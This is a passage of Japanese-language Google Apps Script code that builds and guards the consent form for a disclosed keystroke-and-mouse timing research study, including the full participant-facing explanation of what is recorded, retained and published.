    //   **同じ P-ID のまま受付メールが送り直される**（★ 新しい ID は増えない）。
    //   → ⚠️ 誤った断定は、より簡単な復旧手段（再提出の案内）を塞いでいた。
    Logger.log(
      "❌⚠️★★ 受付メールに失敗しました（P-ID は確定済: " +
        pid +
        " / OS: " +
        a.os +
        "）。\n" +
        "   ★ 復旧は 2 通り: (1) 同じメールで**もう一度提出**してもらう\n" +
        "      （★ 同じ P-ID のまま再送されます。⚠️ 新しい ID は増えません）\n" +
        "      (2) 研究者が手で送る\n" +
        "   宛先: " +
        o1MaskEmail_(a.email) +
        "（実アドレスは Phase1 ロスターの " +
        pid +
        " の行）\n" +
        "   原因: " +
        mailErr
    );
    // ⚠️★★ **"blocked" ではない。** ★ P-ID は焼けている（★ ロスターに行が増えている）。
    //   ⚠️ blocked と書くと「その ID は未使用」と読まれ、★ 再利用されうる。
    logResult = "partial";
    logReason = "mail-failed/" + outcome.reason;
  }
  // ★ 追記は **1 回だけ・try の外**（⚠️ 上のコメント参照）。
  o1LogMgmt_(prof.kind, pid, logResult, logReason, outcome.note);
}

// ============================================================
// 段 1 の同意フォーム（S1-C・3 名の確認・ADR-052）
// ============================================================
// このフォームの回答が段 1 の同意の正本である。文面の上流は
// `.steering/20261114-gse-stage1-n3-consent/consent-draft-s1.md`。先に md を直してからここへ写す。
// 同意の項目は md の「同意の項目」と 1 対 1（`o1_form_builder_test.cjs` の §20 が照合する）。
//
// 提出後の処理は O1 と同じ（判断 18）: P-ID の採番（Phase1 のロスター）・登録ログ（種別 `s1-register`）・
// 受付メール。O1 と違うのは、フォームの ID（`FORM_ID_S1_CONSENT`）・アプリの URL
// （`S1_APP_DOWNLOAD_URL`）・受付メールの文面・トリガの関数（`onS1ConsentSubmit`）だけ。
//
// 守り:
//   - 構築は G1 と O1 のフォームの ID を拒む（O1 の同意の正本を段 1 の構築で消さない）。
//   - 段 1 のアプリの URL が O1 のものと同じなら止める。O1 の配布物には `s1.mode` が無く、
//     問いが出ないまま素の O1 として記録が進むため。
//   - 段 1 のトリガの付け外しは O1 のトリガに触らない。

/** 期間（md §2 と同意項目 3 の逐語）。 */
var S1_PERIOD_TEXT = "長くても 8 週間";
/** 1 時間あたりの問いの上限（`probe_arbiter.rs` の `S1_MAX_PROBES_PER_HOUR` と一致させる。§20 が照合する）。 */
var S1_MAX_PROBES_PER_HOUR = 9;
/** 登録ログの種別。O1 の `register` と分ける。 */
var S1_MGMT_KIND = "s1-register";
/** 同意の項目の選択肢（トリガの設置の前の照合も使う）。 */
var S1_CONSENT_CHOICE = "同意する / 理解した";

/** 段 1 の設定。ロスターと登録ログは O1 と共有する（採番元は 1 か所）。 */
function s1Config_() {
  var props = PropertiesService.getScriptProperties();
  var o1 = o1Config_();
  return {
    consentFormId: String(props.getProperty("FORM_ID_S1_CONSENT") || "").trim(),
    appDownloadUrl: String(props.getProperty("S1_APP_DOWNLOAD_URL") || "").trim(),
    o1ConsentFormId: o1.consentFormId,
    o1SurveyFormId: o1.surveyFormId,
    o1AppDownloadUrl: o1.appDownloadUrl,
    rosterSheetId: o1.rosterSheetId,
    mgmtSheetId: o1.mgmtSheetId,
  };
}

/** 段 1 の設定の問いを配列で返す（構築とトリガの設置が共有する）。 */
function s1ConfigProblems_() {
  var cfg = s1Config_();
  var out = [];
  if (!cfg.consentFormId) {
    out.push("スクリプト プロパティ FORM_ID_S1_CONSENT が空です（空フォームを作って編集 URL の ID を入れる）");
  } else {
    var g1Label = o1G1FormLabel_(cfg.consentFormId);
    if (g1Label) {
      out.push("FORM_ID_S1_CONSENT に G1 のフォーム ID が入っています（" + g1Label + "）。段 1 用の空フォームを別に作ってください。");
    }
    if (cfg.consentFormId === cfg.o1ConsentFormId || cfg.consentFormId === cfg.o1SurveyFormId) {
      out.push("FORM_ID_S1_CONSENT が O1 のフォームと同じ ID です（O1 の同意の正本を消します）。段 1 用の空フォームを別に作ってください。");
    }
  }
  if (!cfg.rosterSheetId) {
    out.push("スクリプト プロパティ PHASE1_MGMT_SHEET_ID が空です（P-ID の採番元。空だと登録しても発番できません）");
  } else if (o1IsKnownWrongRoster_(cfg.rosterSheetId)) {
    out.push("PHASE1_MGMT_SHEET_ID が古いほうの管理シートを指しています（実在の P-ID と衝突します）");
  }
  var mgmtProblem = o1MgmtConfigProblem_(cfg);
  if (mgmtProblem) out.push(mgmtProblem);
  var urlProblem = s1AppDownloadUrlProblem_(cfg.appDownloadUrl, cfg.o1AppDownloadUrl);
  if (urlProblem) out.push(urlProblem);
  if (!O1_CONTACT_EMAIL || O1_CONTACT_EMAIL.indexOf("@") < 0) {
    out.push("O1_CONTACT_EMAIL が不正です（削除の申し出先が無いと同意文書 §6 が嘘になります）");
  }
  return out;
}

/**
 * 段 1 のアプリの URL の問い（無ければ空文字）。値そのものは返さない。
 * 構築・トリガの設置・受付メールの本文の 3 か所が同じ判定を使う。
 */
function s1AppDownloadUrlProblem_(url, o1Url) {
  if (!url) {
    return "スクリプト プロパティ S1_APP_DOWNLOAD_URL が空です（受付メールが止まります。段 1 用の配布フォルダを指すこと）";
  }
  if (o1AppDownloadUrlIsBad_(url)) {
    return "スクリプト プロパティ S1_APP_DOWNLOAD_URL が URL ではありません（https:// で始まる配布フォルダの URL を入れる）";
  }
  if (o1Url && s1UrlKey_(url) === s1UrlKey_(o1Url)) {
    return "S1_APP_DOWNLOAD_URL が O1_APP_DOWNLOAD_URL と同じです（O1 の配布物には s1.mode が無く、問いが出ないまま記録が進みます）";
  }
  return "";
}

/** 読み取り専用の設定チェック。フォームを変更しない。 */
function checkS1FormConfig() {
  var problems = s1ConfigProblems_();
  if (!problems.length) {
    Logger.log("設定は揃っています。buildS1ConsentForm() を実行できます。");
    return true;
  }
  Logger.log("設定に問題があります（" + problems.length + " 件）:");
  problems.forEach(function (p) {
    Logger.log("  - " + p);
  });
  return false;
}

/** O1 のフォームの ID を拒む。`FormApp.openById` より前に呼ぶ。 */
function s1AssertNotO1Form_(id) {
  var cfg = o1Config_();
  if (id && (id === cfg.consentFormId || id === cfg.surveyFormId)) {
    throw new Error(
      "FORM_ID_S1_CONSENT に O1 のフォーム ID が入っています。中止しました（O1 の同意の正本に触れません）。\n" +
        "段 1 用の空フォームを新しく作り、その ID を貼ってください。"
    );
  }
}

/** O1 の構築とトリガが段 1 の同意フォームに触れないようにする（逆向きの守り）。 */
function o1AssertNotS1Form_(id, varName) {
  var s1Id = String(PropertiesService.getScriptProperties().getProperty("FORM_ID_S1_CONSENT") || "").trim();
  if (id && s1Id && id === s1Id) {
    throw new Error(
      varName + " に段 1 の同意フォームの ID（FORM_ID_S1_CONSENT）が入っています。中止しました（段 1 の同意の正本に触れません）。"
    );
  }
}

/**
 * 段 1 のフォームは回答があれば作り直さない。O1 の `O1_ALLOW_REBUILD_WITH_RESPONSES` は見ない
 * （O1 の作業で立てたフラグで段 1 の同意の記録を消さない）。回答数を読めないときも止める。
 */
function s1AssertSafeToRebuild_(form) {
  var n;
  try {
    n = form.getResponses().length;
  } catch (e) {
    throw new Error("S1-C の回答数を確認できませんでした: " + e + "\n確認できない以上、作り直しません（fail-closed）。");
  }
  if (n !== 0) {
    throw new Error(
      "S1-C には既に回答が " + n + " 件あります。作り直しを中止しました（fail-closed）。\n" +
        "文面を直すときは、新しい空フォームを作って FORM_ID_S1_CONSENT を付け替え、研究者が同意を取り直してください。"
    );
  }
}

/**
 * URL を比べる形に直す。Google Drive（drive.google.com / docs.google.com）でフォルダ・ファイルの ID が
 * 取れればその ID。それ以外は、ホストを小文字にし、クエリ・断片・末尾の / を落とした形（パスの大小は保つ）。
 */
function s1UrlKey_(url) {
  var u = String(url || "").trim();
  var hm = u.match(/^https?:\/\/([^\/?#]+)(.*)$/i);
  if (!hm) return u;
  var host = hm[1].toLowerCase();
  var rest = hm[2];
  if (host === "drive.google.com" || host === "docs.google.com") {
    var m = rest.match(/\/folders\/([A-Za-z0-9_-]+)/) || rest.match(/\/d\/([A-Za-z0-9_-]+)/) || rest.match(/[?&]id=([A-Za-z0-9_-]+)/);
    if (m) return "drive:" + m[1];
    rest = rest.replace(/\/u\/\d+\//, "/");
  }
  return host + rest.replace(/[?#].*$/, "").replace(/\/+$/, "");
}

/** ID の検証 → 開く。順序を入れ替えない（検証が先）。 */
function s1OpenFixed_(id) {
  if (!id) {
    throw new Error(
      "FORM_ID_S1_CONSENT が空です。フォームを量産しないため停止しました。\n" +
        "先に Google Forms で空フォームを作り、編集 URL の ID を FORM_ID_S1_CONSENT に貼ってください。"
    );
  }
  o1AssertNotG1Form_(id, "FORM_ID_S1_CONSENT");
  s1AssertNotO1Form_(id);
  return FormApp.openById(id);
}

function s1ConsentFormTitle_() {
  return "GSE ふだんの作業と短い問いの記録 — 説明・同意（参加登録）";
}

/** フォームの冒頭の説明（md の前書きと §1）。 */
function s1ConsentFormDescription_() {
  return (
    "ご検討ありがとうございます。以下をお読みのうえ、ご回答ください。\n" +
    "説明を聞いたうえで決めていただくもので、断っても不利益は一切ありません。\n\n" +
    "【何をする研究か】\n" +
    "この研究は、ふだんのパソコン作業のあいだ、キーボードやマウスの「操作のしかた」を記録し、" +
    "作業中にときどき画面に出る短い問いへのお答えと合わせて、作業の進み方と手が止まる時間を調べるものです。\n" +
    "文章の中身・画面の内容は記録しません。記録するのは「いつ・どの種類の操作をしたか」と、問いへのお答えです。\n" +
    "G1（課題の実験）や O1（ふだんの作業の長期記録）とは別の研究です。\n\n" +
    "この研究は、大学などの倫理審査委員会の審査を受けていません。研究者が、記録の中身（文章の中身や画面の内容を取らない）・" +
    "保管・削除のしかた・お願いする相手の範囲を限り、問いの数に上限を置き、問いに答えなくてよく、画面の表示を切れて、" +
    "いつでも止めたりやめたりできるようにしたうえで、進めてよいと判断しました。"
  );
}

/**
 * 説明の節（md §2〜§6）。[見出し, 本文] の配列。フォームでは見出しの項目として並べる。
 * 1 つの説明欄に全部を入れず、節に分けて読みやすくする。
 */
function s1ConsentSections_() {
  return [
    [
      "お願いすること",
      "・ふだんどおりに作業していただくだけです。特別な課題はありません。\n" +
        "・期間は前半と後半をあわせて数週間で、" + S1_PERIOD_TEXT + "です。始める日と終わる日は、研究者からお知らせします。\n" +
        "・記録用のアプリを起動しておいていただきます。参加の確認を済ませると、パソコンにログインしたときに自動で起動するよう設定されます" +
        "（設定でいつでも切れます。切り方は配布フォルダの説明書にあります）。いつでも止められます。\n" +
        "・作業中、ときどき画面のすみに短い問いが出ます。1 日の終わりにも 1 つ問いが出ます。アプリの画面で「問いに同意する」を押すまで、問いは出ません。\n" +
        "・後半の期間には、日によって画面に表示が出ます。\n" +
        "・いま何の作業をしているかを、画面の表示から 5 つの選択肢で選んでいただきます" +
        "（論述 / 通信文 / デザイン・映像・制作作業 / vibe coding / その他・細切れの作業）。" +
        "メールを読む・調べものなど、どれとも決めづらいときは「その他・細切れの作業」を選んでください（メールを書くのは「通信文」です）。" +
        "選ばなくてもかまいません。何を選んでも、記録する内容は変わりません。\n" +
        "・謝礼はありません。\n\n" +
        "問いへのご同意は、この研究に参加していただく条件です。問いに同意いただけない場合は、参加をお断りいただくことになります。" +
        "個々の問いには答えなくてかまいません。",
    ],
    [
      "記録するもの",
      "・キーを押した時刻（ミリ秒）と、キーの種類（文字キー / 数字 / 記号 / 句読点 / 空白 / 改行 / Tab / バックスペース / Delete / " +
        "修飾キー / ファンクションキー / Esc / 矢印キー、Windows ではさらにテンキー）。文字キーは 26 種類がすべて同じ「文字キー」として" +
        "記録されるので、打った言葉を復元することはできません（ただし、時刻と操作の並びから、作業していたか・手が止まっていたかといったようすは推し量れます）。" +
        "図面・動画編集などの文字をあまり打たない作業でも「作業していた」と「席を外していた」を取り違えないために、操作の種類を数えます。お使いの OS によって、記録されるキーの種類がすこし違います" +
        "（テンキーは Windows でのみ。Mac のノート型では PageUp / PageDown / Home / End は矢印キーとして記録されます）\n" +
        "・日本語入力の変換にかかった時間\n" +
        "・貼り付けの回数と文字数（中身は取得しません）\n" +
        "・画面の切り替えが起きた時刻（どのアプリへ切り替えたかは記録しません）\n" +
        "・マウスの「動いた量・ホイールの回数」（Windows ではさらに「押した回数」）を 1 秒ごとに数えた値。" +
        "位置は記録しないので、画面のどこを触っていたかは分かりません\n" +
        "・キーボードの配列の種類（開始時に 1 回だけ）／アプリの版／記録がうまくいっていたかの状態\n" +
        "・この端末の導入ごとに作った乱数の識別子（16 桁・開始時に 1 回だけ）。端末や個人を特定する情報ではありません。" +
        "複数の端末で使うときに、記録を端末ごとに分けるためだけに使います（機体番号・ホスト名などは使いません）\n" +
        "・（macOS のみ）パスワード入力中だった区間の印（中身は取得しません）\n" +
        "・上の記録から計算した「作業の状態」の推定値。この推定値をもとに助言や通知が出ることはありません。" +
        "短い問いが出るかどうかも、この推定値とは関係なく、時計と操作の事実と、ランダムな抽選で決まります。" +
        "推定は研究のための目安であり、あなたの能力や成果を評価するものではありません\n" +
        "・短い問いへのお答え・答えなかったこと・答えるまでにかかった時間\n" +
        "・1 日の終わりの問いへのお答え・答えなかったこと\n" +
        "・後半の表示について、日ごとの記録",
    ],
    [
      "記録しないもの",
      "・どの文字を打ったか（本文）／画面の内容・スクリーンショット\n" +
        "・アプリの名前・ウィンドウのタイトル・URL・ファイル名・プロジェクト名／どのアプリへ切り替えたか\n" +
        "・マウスの位置・軌跡・画面の解像度・モニタの配置／クリップボードの中身\n" +
        "・端末を特定できる情報（機体番号・ホスト名など）／位置情報・端末の中の他のファイル／音声・映像\n" +
        "・問いへのお答えの理由・自由に書いた文・お相手のお名前（入力欄をつくりません）\n" +
        "・表示の見た目そのもの（画面の写し）",
    ],
    [
      "短い問いについて",
      "作業中、ときどき画面のすみに小さなカードが出ます。作業を強制的に止めたり、作業中の窓を覆い隠したりはしませんが、" +
        "手前に出るので、注意がそれることはあります。\n" +
        "カードは「カードが出る前の30秒について」尋ねます（答えるまでに時間がたっても、カードが出た時より前の30秒です）。問いは 1 つずつ出ます。" +
        "ボタンを 1 回押すか、キーボードで ⌥（Windows では Ctrl と Alt）と数字を押すと答えになり、次の問いがあれば続けて出ます。\n" +
        "1. カードが出る前の30秒、何をしていましたか（熟考 / 詰まり / 外部資料 / 会話 / 離席 / 作業 / 回答不能 から 1 つ。" +
        "「作業」は、手を動かしていた（進んだかは問わない。入力・編集・単純作業を含む）ときです。" +
        "いくつか当てはまるときは、いちばん長かったもの。同時にしていたときは、詰まっていたなら詰まり、そうでなく手が動いていたなら作業）\n" +
        "2. 1 で「詰まり」「熟考」「作業」を選んだときだけ、続けて次の 2 つを尋ねます（「作業」を選んだときは、前に進んでいる感覚を先に尋ねます）。" +
        "どれだけ詰まっていた感覚ですか（1〜5）。どれだけ前に進んでいる感覚ですか（1〜5）。\n\n" +
        "キーで答えることについて:\n" +
        "・カードが出てから 2 分のあいだだけ、⌥（Windows では Ctrl と Alt）と数字 0〜7 の組をこのアプリが受け取ります。" +
        "そのあいだ、ほかのアプリではこの組を使えず、押すと答えになります。2 分を過ぎるか、カードが消えると元に戻ります。2 分を過ぎたら、ボタンで答えます。\n" +
        "・キーで答えても、作業中の文書に文字は入りません。0 でカードを閉じます。\n" +
        "・答えに押した数字は、ほかの打鍵と同じく「数字」の種類として記録に残ります（どの数字かは残りません）。" +
        "研究では、カードが出ていたあいだの操作を、作業の止まりの分析から除きます。\n" +
        "・ほかのアプリがすでにこの組を使っているなどでキーを受け取れないときは、ボタンの表示だけになります。ボタンを押して答えてください。\n\n" +
        "どれくらい出るか（アプリが守る上限です）:\n" +
        "・記録を動かしている 1 時間あたり、多くても " + S1_MAX_PROBES_PER_HOUR + " 回です" +
        "（ランダムな時刻に出るものが多くても 6 回、操作が止まったあとに出るものが多くても 3 回）。\n" +
        "・20 分のあいだでは、多くても 3 回です。\n" +
        "・間隔はふつう 6 分以上ですが、2 種類の問いが近づいたときは、2 分ほどの間隔で続けて出ることがあります。\n" +
        "・1 日じゅう動かしていれば、その日は数十回になります。\n\n" +
        "主にランダムな時刻に出ます。そのほかに、しばらく操作が止まっていたあとや、ほかの画面から戻ってきたあとの最初の操作で出ることがあります。" +
        "どの時刻に出すかはアプリが決め、すべての参加者で同じ決め方にしています。そのため、出る回数を人ごとに変えることはしません。" +
        "多いと感じたときは、答えずに閉じていただくか、一時停止していただくか、参加をやめていただけます。\n\n" +
        "・答えなくてかまいません。閉じていただいても、参加にもそのほかのことにも影響しません。\n" +
        "・理由はお聞きしません。自由に書いていただく欄もつくりません（お相手のお名前・アプリの名前・ファイル名などが残らないようにするためです）。\n" +
        "・記録に残るのは、問いを出した時刻、7 つのうちどれを選んだか、目盛りの値（尋ねたときだけ）、答えなかったこと（「思い出せない」「閉じる」のどちらで閉じたかを含む）、" +
        "答えるまでにかかった時間です。1 つ目に答えたあとで閉じたときは、そこまでのお答えが残ります。問いを出す候補になったのに出さなかった時刻とその理由（間隔が近すぎたなど）も残ります。\n\n" +
        "正直に書いておきたいこと:\n" +
        "1. 「会話」をお選びになると、「その時刻に会話していた」ことが記録に残ります。お相手が誰かは残りません。" +
        "それでも気になるときは、「この時間帯を消して」をお使いください。お答えもいっしょに消えます。" +
        "ご同席の方が気にされる場合も、あなたからお申し出いただければ同じように消せます。\n" +
        "2. 問いが出ること自体が、ふだんの作業を少し変えてしまう可能性があります。私たちはそれを隠さずに、どれくらい変わるのかも含めて調べます。\n\n" +
        "記録は 48 時間おいて自動的に送られます。送られたあとは、あなたの端末の操作だけでは消えません。" +
        "気になるお答えは、送られる前（その日と、その次の 2 日ほど）に消していただけます。",
    ],
    [
      "1 日の終わりの問いについて",
      "夕方から夜（17 時〜23 時）のあいだに、その日の作業について 1 つ尋ねるカードが出ます。" +
        "出るのは、そのあいだに操作が 20 分ほど止まったとき、アプリを終了するとき、一時停止から戻ったときのどれかで、その日については 1 回です。\n" +
        "・問いは「今日の作業にどのくらい熱意を持てましたか」で、1〜5 の目盛りで答えます。\n" +
        "・その日に答えがなかったとき（問いが出なかったとき、閉じたときを含む）は、翌日の最初に「昨日の作業」について 1 回だけ尋ねます。" +
        "1 つの日について尋ねるのは 2 回までです。そのため、前の日の分と当日の分の 2 枚が出る日があります。\n" +
        "・答えなくてかまいません（「今日は答えない」で閉じられます）。理由はお聞きしません。\n" +
        "・記録に残るのは、尋ねた日、出たきっかけ（夕方の途切れ・終了・一時停止からの再開・翌日）、目盛りの値か答えなかったこと、" +
        "カードを出した時刻と閉じた時刻、答えるまでにかかった時間です。",
    ],
    [
      "後半の画面の表示について",
      "後半の期間には、日によって、画面の背景と画面の下の縁に、線の表示が出ます。表示は、あなたのキーボードとマウスの操作に合わせて動きます。\n" +
        "・後半の初日は、必ず表示が出ます。2 日目からは、前もって作った無作為の表で、表示が出る日と出ない日が決まります。" +
        "どの日が出る日かは、前もってはお知らせしません。\n" +
        "・表示はマウスの位置とクリックにも合わせて動きますが、マウスの位置やクリックの場所は記録しません。\n" +
        "・表示が邪魔なときは、画面上部（Windows では画面右下）のアプリのアイコンのメニューから「やめる」を選ぶと、" +
        "その日のあいだは表示が出なくなります。「描く」を選ぶと戻ります。翌日は表のとおりに戻ります。" +
        "カーソル・クリックに合わせた動きも、同じメニューから個別に切れます。\n" +
        "・表示を見るために、ほかのアプリの窓をいったんどけることができます（もう一度操作すると戻ります）。\n" +
        "・表示は作業の妨げにならないように作っていますが、気になるときは上のとおり切っていただいてかまいません。切っても不利益はありません。\n\n" +
        "この表示について記録するもの（日ごとに 1 行と、その日の途中の 5 分ごとの写し）:\n" +
        "・その日が表示の出る日だったか（無作為の表での割り当て）\n" +
        "・その日に表示が出ていた時間と、画面の下の縁の表示が見えていた時間（画面のロック中・スリープ中・ほかの窓に隠れていたときなど、見えなかった時間を除いたもの）\n" +
        "・「やめる」「描く」を選んだ時刻と、カーソル・クリックの動きを切った・戻した時刻\n" +
        "・表示を始めた時刻、ほかの窓をどけた回数\n" +
        "・表示の描き方を決める乱数の値と、無作為の表の照合用の値\n" +
        "表示の見た目そのもの（画面の写し）は記録しません。打ったキーの内容も、この表示の記録には入りません。",
    ],
    [
      "あなたがいつでもできること（3 点）",
      "1. 記録中だと分かる … 記録している間はずっと画面に印が出ます（印が出ていないときは記録していません）。\n" +
        "2. すぐ止める … ワンクリックで一時停止できます。理由を聞きません。一時停止中は問いが出ません。後半の期間なら、一時停止中も画面の表示は出たままですが、操作には合わせて動かず、表示についても記録しません。\n" +
        "3. あとから「この時間帯を消して」と言える … 時間帯を指定して削除できます（例:「昨日の 14:00〜15:00」）。理由を説明する必要はありません。\n\n" +
        "3 番で消える範囲:\n" +
        "・その時間帯の操作の記録、問いへのお答え（1 日の終わりの問いを含む）、後半の表示について記録した時刻と量が消えます。\n" +
        "・残るのは、その日が表示の出る日だったかどうか（無作為の表での割り当て）、記録のファイルごとの始まりの印と設定（始まった時刻を含む）、" +
        "問いの出し方の設定です。研究の計算の土台になるためで、あなたがその時間に何をしていたかは含みません。\n" +
        "・直前の時間帯を消すときは、一時停止せずに、記録したまま消してください。一時停止中は、いちばん新しい記録だけは消せません（再開すると消せます）。\n\n" +
        "記録は 1 日ごとにひとまとまりにして、そこから 48 時間おいてから研究者へ送られます。\n" +
        "・送られる前（その日と、その次の 2 日ほど）… あなたの端末の上で消えます。研究者に届きません。\n" +
        "・送られたあと … 研究者に「消してください」とお伝えください。研究者側で削除し、削除したことを記録に残します" +
        "（あなたの端末の操作だけでは消えません）。\n" +
        "どちらの場合も、理由を説明する必要はありません。",
    ],
    [
      "参加をやめる",
      "・参加はいつでもやめられます。やめても不利益はありません。\n" +
        "・アプリの画面で「問いへの同意を取り消す」を押すと、問いは出なくなり、参加をやめたことになります。" +
        "そのあとはアプリを終了し、自動で起動する設定を切って、研究者にお知らせください（切り方は配布フォルダの説明書にあります）。\n" +
        "・取り消しても、アプリを終了して自動で起動する設定を切るまでは、操作の記録は続き、研究者へ送られます（後半の期間なら画面の表示も出ます）。" +
        "研究者は、取り消した時刻より後の記録を削除し、研究に使いません。\n" +
        "・やめるときに、それまでの記録を研究に使ってよいか、すべて削除するかを選べます。" +
        "削除を選んだときは、上の手順で、送られる前の分も送られたあとの分も削除します。\n" +
        "・すべて削除を選んだときも、同意のフォームへのご回答（同意したことの記録）と、削除したことの記録は残ります。公表した後の数値は取り除けません。",
    ],
    [
      "記録の保管",
      "・記録はまず、あなたの端末の中だけに保存します。クラウド同期フォルダ（OneDrive 等）には置きません。\n" +
        "・そのうえで、1 日ごとにひとまとまりにした記録を、48 時間おいてから暗号化して自動的に研究者へ送ります。\n" +
        "  なぜ自動なのか: 手作業でまとめて送っていただく形だと手順が多く、続けていただくのが難しいためです。\n" +
        "  なぜ 48 時間おくのか: 送る前なら、あなたが「この時間帯を消して」と言えば端末の上で消えるからです。\n" +
        "  送るのは上に書いた記録だけです。本文・画面の内容・アプリ名は入っていません。\n" +
        "  送信を止めたいときは、いつでもお申し出ください。止めるまでのあいだに送られた分は、お申し出があれば削除します。\n" +
        "・記録は P0xx のような記号で管理し、氏名・連絡先とは別に保管します。\n" +
        "・保管の上限: 暗号化した記録は" + O1_RETENTION_ENCRYPTED + "、研究者が復号したものは" + O1_RETENTION_PLAINTEXT +
        "、個人が特定できない集計値は" + O1_RETENTION_METRICS + "。上限に達したものは、お申し出が無くてもこちらで削除します。",
    ],
    [
      "結果の公表について",
      "・記録と、記録から計算した値は、この研究（今回の確認と、のちに同じ手順で別の参加者に行う確認との比べ）にだけ使います。ほかの研究には使いません。\n" +
        "・研究の結果は、論文や研究の応募書類などで公表します。公表するのは、記録から計算した数値と図、その計算のプログラムです。\n" +
        "・参加者が少ないため、1 人ずつの数値と図を P0xx のような記号で示します。\n" +
        "・お名前・連絡先・記録した日付と時刻は入れません。お使いのパソコンの種類（Windows / Mac）や作業の種類は、" +
        "それを示すと誰の結果か分かるおそれがあるときは示しません。公表の前に、研究者が数値と図からあなたが分からないことを点検します。\n" +
        "・研究者は、記号とあなたとの対応を知っています。点検しても、あなたを知る人が推し量る可能性を完全になくすことはできません。" +
        "そのため、公表の前に、あなたの分の数値と図をお見せします。載せないよう求めていただければ、あなたの分は載せません。\n" +
        "・論文に載せた数値は、上の保管の上限が来ても消えません（削除するのは研究者の手元の記録と集計値です）。" +
        "公表する前であれば、削除のお申し出で公表の対象から外します。公表した後は、公表済みの数値からあなたの分だけを取り除くことはできません。\n" +
        "・記録そのもの（加工したものを含む）は公開しません。",
    ],
    [
      "お問い合わせ",
      "研究責任者: " + O1_CONTACT_NAME + "（" + O1_AFFILIATION + "）\n" +
        "連絡先: " + O1_CONTACT_EMAIL + "\n" +
        "記録の削除をご希望のときも、上の連絡先へお申し出ください。理由をお聞きすることはありません。\n\n" +
        "説明を聞いたうえで、参加するかどうかを決めてください。断っても不利益は一切ありません。" +
        "この研究は、研究者が直接存じ上げている方にお願いしています。断っても、途中でやめても、研究者とのお付き合いには影響しません。",
    ],
  ];
}

/** 同意項目。md の「同意の項目」と 1 対 1・同じ文（§20 が照合する）。 */
function s1ConsentItemTitles_() {
  return [
    "上の説明を読み、質問する機会がありました。",
    "この研究が倫理審査委員会の審査を受けておらず、研究者の判断で進めていることの説明を受けました。",
    "ふだんの作業のあいだ、キーやマウスの操作のしかたが、" + S1_PERIOD_TEXT + "にわたって記録されることを理解しました。",
    "文章の中身・画面の内容・アプリ名・URL・ファイル名は記録されないことを理解しました。",
    "この記録から「いつ作業していて、いつ離れていたか」の時間の並びが残ることの説明を受けました。",
    "作業中にときどき短い問いが出ること（1 時間に多くても " + S1_MAX_PROBES_PER_HOUR +
      " 回）と、1 日の終わりに 1 つ問いが出ることを理解し、問いに同意します。個々の問いには答えなくてよく、理由を聞かれないこと、" +
      "日の終わりの問いに答えなかった日は翌日にもう一度尋ねられることがあることを理解しました。",
    "問いで「会話」を選ぶと、その時刻に会話していたことが記録に残ることの説明を受けました。",
    "後半の期間には、日によって画面の背景と下の縁に操作に合わせて動く表示が出ること、後半の初日は必ず出て、2 日目からは出る日かが無作為の表で決まること、" +
      "表示はいつでも切れること、表示について上の説明のとおりの記録が残ることを理解しました。",
    "参加の確認の後、ログイン時にアプリが自動で起動するよう設定されること、記録している間は画面に印が出ること、" +
      "ワンクリックでいつでも一時停止でき、理由を聞かれないことを理解しました。",
    "1 日ごとにまとめた記録が、48 時間おいてから暗号化されて自動的に研究者へ送られることの説明を受けました。",
    "送られる前なら端末の上で消せること、送られたあとは研究者に申し出れば削除され、その削除が記録に残ること、" +
      "時間帯を消しても表示の割り当てと、記録のファイルの始まりの印と設定（何をしていたかを含まないもの）は残ることを理解しました。",
    "保管の上限（暗号化した記録は" + O1_RETENTION_ENCRYPTED + "、復号したものは" + O1_RETENTION_PLAINTEXT +
      "、集計値は" + O1_RETENTION_METRICS + "）の説明を受けました。",
    "研究の結果が 1 人ずつの数値と図として記号で公表されること、誰の結果か分かるおそれがある属性は示されないこと、" +
      "公表の前に自分の分の数値と図を見せてもらい載せないよう求められること、" +
      "公表した数値は後から取り除けないこと、記録そのものは公開されないこと、" +
      "記録と計算した値はこの研究（今回の確認と、のちに同じ手順で行う確認との比べ）にだけ使われることの説明を受けました。",
    "参加はいつでもやめられ、問いへの同意を取り消すと参加をやめたことになること、" +
      "取り消した後もアプリを終了するまでは記録が続き、その分は研究者が削除すること、" +
      "やめるときにそれまでの記録の削除も求められることを理解しました。" +
      "謝礼が無いことを理解しました。",
    "上記すべてに同意し、この記録と研究利用に同意します。",
  ];
}

/**
 * 段 1 の同意フォームを構築する。設定に問いがあれば何も開かずに止まる（fail-closed）。
 * 回答があるフォームは作り直さない（`o1AssertSafeToRebuild_`）。
 */
function buildS1ConsentForm() {
  var problems = s1ConfigProblems_();
  if (problems.length) {
    throw new Error(
      "設定に問題があるので構築しません（fail-closed）:\n  - " +
        problems.join("\n  - ") +
        "\n\ncheckS1FormConfig() で同じ内容を読み取り専用で確認できます。"
    );
  }
  var form = s1OpenFixed_(s1Config_().consentFormId);
  s1AssertSafeToRebuild_(form);
  o1ClearForm_(form);

  form.setTitle(s1ConsentFormTitle_());
  form.setDescription(s1ConsentFormDescription_());
  form.setCollectEmail(false); // 下の設問で明示的に取る（何を取るかを本人に見せる）
  form.setShowLinkToRespondAgain(false);
  form.setConfirmationMessage(
    "ご回答ありがとうございます。\n" +
      "参加者ID とアプリの入手方法を、ご記入のメールアドレスへお送りします。\n" +
      "届かない場合は " + O1_CONTACT_EMAIL + " へお知らせください。"
  );

  s1ConsentSections_().forEach(function (sec) {
    o1AddSectionHeader_(form, sec[0], sec[1]);
  });

  o1AddSectionHeader_(
    form,
    "同意の確認",
    "以下のすべてに同意いただける場合のみ、参加をお願いします。\n" +
      "1 つでも同意いただけない項目があれば、このまま閉じてください（不利益はありません）。"
  );
  s1ConsentItemTitles_().forEach(function (title) {
    var q = form.addCheckboxItem();
    q.setTitle(title);
    q.setChoices([q.createChoice(S1_CONSENT_CHOICE)]);
    q.setRequired(true);
  });

  o1AddSectionHeader_(
    form,
    O1_REGISTRATION_HEADER,
    "参加者ID をお送りするため、また削除のお申し出を受け付けるために必要です。\n" +
      "記録（操作のログ）とは別に保管し、P0xx とのみ結び付けます。"
  );
  O1_REGISTRATION_TITLES.forEach(function (title) {
    o1AddRegistrationItem_(form, title);
  });

  o1RecordFormUrl_("S1_CONSENT", form, "S1-C 説明・同意（段 1 の同意の正本）");
  Logger.log("S1-C 説明・同意を構築した: " + form.getPublishedUrl());
  Logger.log("次にやること: previewS1RegisterAckEmail() で文面を確認 → installS1ConsentTrigger()");
}

function s1RegisterAckSubject_() {
  return "【GSE 研究】ご登録ありがとうございます（参加者IDとアプリのご案内・ふだんの作業と短い問いの記録）";
}

/**
